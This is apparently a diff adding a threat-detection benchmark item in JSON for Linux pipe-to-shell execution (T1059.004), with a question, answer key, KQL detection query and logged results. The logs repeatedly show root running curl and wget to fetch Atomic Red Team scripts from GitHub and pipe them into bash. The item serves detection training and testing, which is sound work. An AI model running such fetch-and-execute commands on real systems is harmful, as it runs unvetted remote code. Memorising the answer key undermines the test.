@@ -1,0 +1,90 @@
+{
+    "technique_id": "T1059.004",
+    "question_id": "d0c88567-803d-4dca-99b4-7ce65e7b257c",
+    "context": "On a Linux host, processes are observed invoking command-line tools to fetch and execute remote payloads.",
+    "objective": "Detect when a remote script is downloaded and piped directly into a shell interpreter.",
+    "technical_details": {
+        "command_analysis": "Attackers frequently use curl or wget with a URL piped into bash to retrieve and run scripts in one step. Look for command lines containing these utilities alongside a pipe to a shell.",
+        "detection_approach": "Query process event logs for occurrences of curl or wget commands referencing remote GitHub raw URLs that include script filenames and are piped into bash."
+    },
+    "thinking_how_to_phrase_question_and_answer": "Frame the question to ask which specific script file name was fetched and executed, requiring extraction of the script name from the observed URL.",
+    "prompt": "During a Linux investigation, you notice processes spawning curl and wget commands that pull a script from a remote GitHub raw URL and pipe it into bash. Identify the name of the script that was retrieved and executed.",
+    "answer": [
+        "echo-art-fish.sh"
+    ],
+    "difficulty": "medium",
+    "KQL_query": "let linuxDevices = DeviceInfo\n| where OSPlatform contains \"Linux\"\n| project DeviceId;\nDeviceProcessEvents\n| where DeviceId in (linuxDevices)\n| where ProcessCommandLine has_any (\"curl \", \"wget \")\n| where ProcessCommandLine contains \"|\"\n| where ProcessCommandLine contains \"bash\"\n| where ProcessCommandLine matches regex @\"https?://.*raw\\.githubusercontent\\.com/.+\\.sh\"\n| extend ScriptFile = extract(@\"([^\\s|]+\\.sh)\", 1, ProcessCommandLine)\n| where isnotempty(ScriptFile)\n| project TimeGenerated, DeviceName, InitiatingProcessAccountName, ProcessCommandLine, ScriptFile",
+    "KQL_validation_message": "KQL query validation successful: The query results show multiple entries where the 'ScriptFile' field contains the URL 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh'. This URL corresponds to the script 'echo-art-fish.sh', which is explicitly named in the expected answers. The presence of these entries in the results provides direct evidence that the activities related to 'echo-art-fish.sh' were detected, satisfying the detection question.",
+    "KQL_query_results": [
+        [
+            "TimeGenerated",
+            "DeviceName",
+            "InitiatingProcessAccountName",
+            "ProcessCommandLine",
+            "ScriptFile"
+        ],
+        [
+            "2025-05-07 17:01:52.846514+00:00",
+            "wirpo-test",
+            "root",
+            "sh -c \"curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash; wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\"",
+            "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh"
+        ],
+        [
+            "2025-05-07 17:01:52.850434+00:00",
+            "wirpo-test",
+            "root",
+            "sh -c \"curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash; wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\"",
+            "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh"
+        ],
+        [
+            "2025-05-07 17:01:52.855123+00:00",
+            "wirpo-test",
+            "root",
+            "sh -c \"curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash; wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\"",
+            "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh"
+        ],
+        [
+            "2025-05-07 17:01:53.098247+00:00",
+            "wirpo-test",
+            "root",
+            "sh -c \"curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash; wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\"",
+            "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh"
+        ],
+        [
+            "2025-05-07 17:01:53.098345+00:00",
+            "wirpo-test",
+            "root",
+            "sh -c \"curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash; wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\"",
+            "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh"
+        ],
+        [
+            "2025-05-07 17:02:31.046538+00:00",
+            "wirpo-test",
+            "root",
+            "sh -c \"cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh |bash; ls -la /tmp/art.txt\"",
+            "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh"
+        ],
+        [
+            "2025-05-07 17:02:31.049911+00:00",
+            "wirpo-test",
+            "root",
+            "sh -c \"cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh |bash; ls -la /tmp/art.txt\"",
+            "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh"
+        ],
+        [
+            "2025-05-07 17:02:31.050313+00:00",
+            "wirpo-test",
+            "root",
+            "sh -c \"cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh |bash; ls -la /tmp/art.txt\"",
+            "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh"
+        ],
+        [
+            "2025-05-07 17:02:31.637757+00:00",
+            "wirpo-test",
+            "root",
+            "sh -c \"cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh |bash; ls -la /tmp/art.txt\"",
+            "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh"
+        ]
+    ]
+}
